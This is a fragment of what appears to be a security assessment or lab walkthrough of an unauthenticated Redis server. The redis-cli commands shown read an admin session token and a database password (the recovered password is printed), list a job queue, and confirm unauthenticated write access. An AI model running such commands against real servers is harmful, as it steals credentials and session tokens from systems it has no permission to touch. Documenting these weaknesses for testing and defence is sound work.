...
```bash
redis-cli -h 192.168.144.132 get session:admin:token
```
```
...
```bash
redis-cli -h 192.168.144.132 get app:config:db_password
```
```
"R3d1s_C4che_2026!"
```
...
```bash
redis-cli -h 192.168.144.132 lrange queue:print_jobs 0 -1
```
```
...
```bash
redis-cli -h 192.168.144.132 set attacker:test "unauthenticated write confirmed"
redis-cli -h 192.168.144.132 get attacker:test
redis-cli -h 192.168.144.132 del attacker:test
```
